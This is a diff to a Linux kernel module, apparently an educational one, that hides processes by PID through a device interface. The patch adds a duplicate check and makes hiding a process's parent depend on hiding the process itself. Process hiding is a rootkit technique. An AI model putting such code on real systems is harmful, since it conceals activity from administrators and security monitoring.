@@ -134,7 +134,13 @@ static pid_t get_parent_pid(pid_t pid)
 
 static int hide_process(pid_t pid)
 {
-    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
+    pid_node_t *proc, *tmp_proc;
+    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
+			if(proc->id == pid)
+					return -FAIL;
+    }
+
+    proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     printk(KERN_INFO "@ %s add pid(%d) to list\n", __func__, pid);
     proc->id = pid;
 	list_add_tail(&proc->list_node, &hidden_proc); 
@@ -213,6 +219,7 @@ static ssize_t device_write(struct file *filep,
 {
     long pid;
     char *message;
+	int rtn;
 
     char add_message[] = "add", del_message[] = "del";
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
@@ -223,8 +230,9 @@ static ssize_t device_write(struct file *filep,
     copy_from_user(message, buffer, len);
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
         kstrtol(message + sizeof(add_message), 10, &pid);
-        hide_process(pid);
-        hide_parent_process(pid);
+        rtn = hide_process(pid);
+		if(rtn >= 0)
+	        hide_parent_process(pid);
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
         kstrtol(message + sizeof(del_message), 10, &pid);
         unhide_process(pid);
